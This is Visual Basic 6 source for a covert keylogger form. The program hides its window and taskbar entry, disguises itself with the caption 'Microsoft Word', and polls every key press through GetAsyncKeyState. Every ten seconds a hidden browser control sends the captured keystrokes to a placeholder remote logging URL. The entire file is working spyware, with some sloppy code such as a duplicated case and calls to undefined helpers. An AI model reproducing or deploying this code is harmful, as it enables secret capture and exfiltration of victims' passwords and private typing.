VERSION 5.00
Object = "{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}#1.1#0"; "SHDOCVW.dll"
Begin VB.Form keylog 
   AutoRedraw      =   -1  'True
   BackColor       =   &H80000012&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Microsoft Word"
   ClientHeight    =   3120
   ClientLeft      =   150
   ClientTop       =   840
   ClientWidth     =   4710
   KeyPreview      =   -1  'True
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   3120
   ScaleWidth      =   4710
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
   Begin VB.Timer Timer2 
      Interval        =   10000
      Left            =   3360
      Top             =   1440
   End
   Begin SHDocVwCtl.WebBrowser WebBrowser1 
      Height          =   2655
      Left            =   0
      TabIndex        =   3
      Top             =   480
      Width           =   2895
      ExtentX         =   5106
      ExtentY         =   4683
      ViewMode        =   0
      Offline         =   0
      Silent          =   0
      RegisterAsBrowser=   0
      RegisterAsDropTarget=   1
      AutoArrange     =   0   'False
      NoClientEdge    =   0   'False
      AlignLeft       =   0   'False
      NoWebView       =   0   'False
      HideFileNames   =   0   'False
      SingleClick     =   0   'False
      SingleSelection =   0   'False
      NoFolders       =   0   'False
      Transparent     =   0   'False
      ViewID          =   "{0057D0E0-3573-11CF-AE69-08002B2E1262}"
      Location        =   "http:///"
   End
   Begin VB.Timer Timer1 
      Interval        =   1
      Left            =   120
      Top             =   120
   End
   Begin VB.Label text1 
      BackColor       =   &H8000000E&
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   2775
      Left            =   0
      TabIndex        =   2
      Top             =   0
      Width           =   6735
   End
   Begin VB.Label Label2 
      BackStyle       =   0  'Transparent
      Caption         =   "Key :"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FF0000&
      Height          =   195
      Left            =   2760
      TabIndex        =   1
      Top             =   2760
      Width           =   2580
   End
   Begin VB.Label Label1 
      BackStyle       =   0  'Transparent
      Caption         =   "KeyGrab (running)..."
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FFFF&
      Height          =   195
      Left            =   0
      TabIndex        =   0
      Top             =   2760
      Width           =   5055
   End
   Begin VB.Menu mnu_help 
      Caption         =   "Help"
      Begin VB.Menu Help_Buttons 
         Caption         =   "Buttons"
      End
   End
End
Attribute VB_Name = "keylog"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
''-----------------------||||||||||||||||-----------------<<<
Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
''-----------------------^^^^^^^^^^^^^^^^-----------------<<<
Private Const YOURSITE = "http://www.yoursite.nl/logger/index.php?test="
Dim retVal As Long



Private Sub Form_Load()
App.TaskVisible = False
Dim servID As Long
text1.Caption = ""
DuratioN = 0
DuratioN0 = Timer
durationCounter = 0
retVal = GetConnectedDuration
'UpdateTextBox
End Sub
Private Sub UpdateTextBox()
Dim i, temChr As Byte
Open "test.txt" For Binary Access Read As #11
i = 1
If LOF(11) = 0 Then Exit Sub
Do While i <> LOF(11)
    Get #11, i, temChr
    AddToLog (Chr$(temChr))
    i = i + 1
Loop
Close #11
End Sub



Private Sub Timer1_Timer()
On Error Resume Next
Dim i, x As Long, x2, num, chrCode

For i = 65 To 90
x = GetAsyncKeyState(i)
x2 = GetAsyncKeyState(vbKeyShift)

If x = -32767 Then
    
'---->> For Debug
Label2.Caption = "  Key : " & i & "  ||  Keystate : " & x
''Debug.Print ChrW$(i)
'<<----

DoEvents
    If i > 64 And i < 91 Then
        If x2 = -32767 Or x2 = -32768 Then
            chrCode = i
        Else
            chrCode = i + 32
        End If
    Else
       If i < 58 Then
            chrCode = i
       ElseIf (i > 96 & i < 138 & num <> 0) Then
            chrCode = i - 48
       Else
            chrCode = i
       End If
        
    End If
AddToLog (Chr$(chrCode))
End If
Next i

DoEvents
TestOtherKeys

deskWinTitle = GetDesktopWindowText

End Sub

Private Sub AddToLog(strKey As String)
text1.Caption = text1.Caption & strKey
End Sub

Private Sub TestOtherKeys()
Dim num, shift

x = GetAsyncKeyState(8)   'For bckspace
If x = -32767 Then text1.Caption = Mid(text1.Caption, 1, Len(text1) - 1)


For i = 9 To 255
    
    If i = 65 Then i = 90
    
    x = GetAsyncKeyState(i)
    shift = GetAsyncKeyState(16)
    
    If x = -32767 Then
    '---->> For Debug
    Label2.Caption = "  Key : " & i & "  ||  Keystate : " & x
    ''Debug.Print ChrW$(i)
    '<<----
    
    Select Case i
            Case 13: AddToLog "<br>"
            Case 49: AddToLog IIf(shift = 0, "1", "!")
            Case 50: AddToLog IIf(shift = 0, "2", "@")
            Case 51: AddToLog IIf(shift = 0, "3", "#")
            Case 52: AddToLog IIf(shift = 0, "4", "$")
            Case 53: AddToLog IIf(shift = 0, "5", "%")
            Case 54: AddToLog IIf(shift = 0, "6", "^")
            Case 55: AddToLog IIf(shift = 0, "7", "&")
            Case 56: AddToLog IIf(shift = 0, "8", "*")
            Case 57: AddToLog IIf(shift = 0, "9", "(")
            Case 48: AddToLog IIf(shift = 0, "0", ")")
            Case 96: AddToLog "0"
            Case 97: AddToLog "1"
            Case 98: AddToLog "2"
            Case 99: AddToLog "3"
            Case 100: AddToLog "4"
            Case 101: AddToLog "5"
            Case 102: AddToLog "6"
            Case 103: AddToLog "7"
            Case 104: AddToLog "8"
            Case 105: AddToLog "9"
            Case 106: AddToLog "*"
            Case 107: AddToLog "+"
            ''Case 108: AddToLog "."
            Case 109: AddToLog "-"
            Case 110: AddToLog "."
            Case 111: AddToLog "/"
            Case 226: AddToLog IIf(shift = 0, "\", "|")
            Case 188: AddToLog IIf(shift = 0, ",", "<")
            Case 189: AddToLog "_"
            Case 190:  AddToLog IIf(shift = 0, ".", ">")
            Case 191:  AddToLog IIf(shift = 0, "/", "?")
            Case 190:  AddToLog IIf(shift = 0, ".", ">")
            Case 220:  AddToLog IIf(shift = 0, "\", "|")
            Case 186:  AddToLog IIf(shift = 0, ";", ":")
            Case 222:  AddToLog IIf(shift = 0, "'", Chr$(34))
            Case 219:  AddToLog IIf(shift = 0, "[", "{")
            Case 221:  AddToLog IIf(shift = 0, "]", "}")
    End Select
End If
Next i

End Sub

Private Sub Timer2_Timer()
WebBrowser1.Navigate (YOURSITE + text1.Caption)
text1.Caption = ""
End Sub
